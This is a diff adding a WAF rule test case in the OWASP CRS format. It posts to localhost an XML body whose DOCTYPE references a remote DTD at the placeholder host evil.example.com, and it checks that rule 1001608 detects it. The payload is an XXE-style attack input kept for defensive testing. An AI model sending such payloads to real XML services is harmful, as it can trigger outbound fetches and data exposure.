@@ -1,0 +1,23 @@
+---
+meta:
+  author: "JiuZhang WAF Team"
+  description: DOCTYPE PUBLIC with external DTD URL (CUSTOM_PACK)
+rule_id: 1001608
+tests:
+  - test_id: 1
+    desc: "DOCTYPE PUBLIC referencing remote DTD over http"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: application/xml
+          method: POST
+          port: 80
+          uri: "/post"
+          data: '<!DOCTYPE r PUBLIC "-//E//DTD X//EN" "http://evil.example.com/x.dtd"><r/>'
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [1001608]
